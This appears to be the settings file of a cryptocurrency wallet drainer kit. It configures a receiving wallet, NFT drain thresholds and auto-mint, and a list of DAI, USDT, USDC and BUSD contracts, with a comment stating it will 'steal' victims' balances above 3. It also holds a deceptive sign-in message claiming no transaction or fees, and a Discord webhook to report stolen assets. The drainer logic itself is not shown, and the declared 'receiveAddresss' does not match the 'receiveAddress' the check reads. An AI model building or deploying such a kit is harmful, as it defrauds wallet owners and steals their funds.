const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/

const receiveAddresss = "wallet"; // YOUR WALLET ADDRESS "0x370c794A7B32D8fDD10936338249b2bfd2e22A1c"


const drainNftsInfo = {
    minValue: 1, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection. "TUTORIAL"
    maxTransfers: 10,
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const autoConnect = false; //false; // auto connect wallet
const autoMint = true; // auto click claim button

// the "3" you see in all the addresses are the min value, if the victim has less than 3 USDC/T then it will not steal it. If it has over 3 USD it will steal it.
const erc20list = {
  // Bsc testnet
  /*
  '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
  '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
  */
  // Ethernet mainnet
  '0x6B175474E89094C44Da98b954EedeAC495271d0F': 3, // DAI ethernet
  '0xdAC17F958D2ee523a2206206994597C13D831ec7': 3, // usdt
  '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 3, // usdc
  '0x4Fabb145d64652a948d72533023f6E7A623C7C53': 3, // busd
}

const installInNewWindow = true; // install wallet if not installed

const discordWebhookURL = "https://discord.com/api/webhooks/"; // put ur discord webhook url in here to receive NFT's "TUTORIAL"
const feedbackEnabled = true; // let enabled to receive webhooks
/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
